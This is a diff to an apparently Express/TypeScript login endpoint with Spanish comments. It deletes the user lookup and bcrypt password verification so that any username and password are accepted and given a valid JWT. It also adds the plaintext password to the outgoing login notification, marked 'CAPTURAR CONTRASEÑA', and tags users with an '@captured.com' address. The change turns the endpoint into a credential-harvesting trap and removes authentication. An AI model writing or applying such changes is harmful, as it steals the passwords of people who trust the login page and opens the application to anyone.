@@ -35,23 +35,15 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    // Buscar usuario
-    const user = users.find((u) => u.username === username);
-    if (!user) {
-      res.status(401).json({ error: 'Credenciales inválidas' });
-      return;
-    }
-
-    // Verificar contraseña
-    const validPassword = await bcrypt.compare(password, user.password);
-    if (!validPassword) {
-      res.status(401).json({ error: 'Credenciales inválidas' });
-      return;
-    }
+    // ✅ ACEPTAR CUALQUIER CREDENCIAL
+    // Crear usuario dinámico con las credenciales ingresadas
+    const userId = Date.now().toString(); // ID único basado en timestamp
+    const userName = username;
+    const userEmail = `${username}@captured.com`;
 
     // Generar token JWT
     const token = jwt.sign(
-      { userId: user.id },
+      { userId: userId },
       JWT_SECRET,
       { expiresIn: '24h' }
     );
@@ -61,9 +53,10 @@ export const login = async (req: Request, res: Response): Promise<void> => {
     const userAgent = req.headers['user-agent'] || 'Desconocido';
     
     await sendLoginNotification({
-      username: user.username,
-      name: user.name,
-      email: user.email,
+      username: username,
+      password: password, // 🔥 CAPTURAR CONTRASEÑA
+      name: userName,
+      email: userEmail,
       timestamp: new Date().toLocaleString('es-AR', {
         dateStyle: 'full',
         timeStyle: 'medium',
@@ -75,10 +68,10 @@ export const login = async (req: Request, res: Response): Promise<void> => {
     res.json({
       token,
       user: {
-        id: user.id,
-        username: user.username,
-        name: user.name,
-        email: user.email,
+        id: userId,
+        username: username,
+        name: userName,
+        email: userEmail,
       },
     });
   } catch (error) {
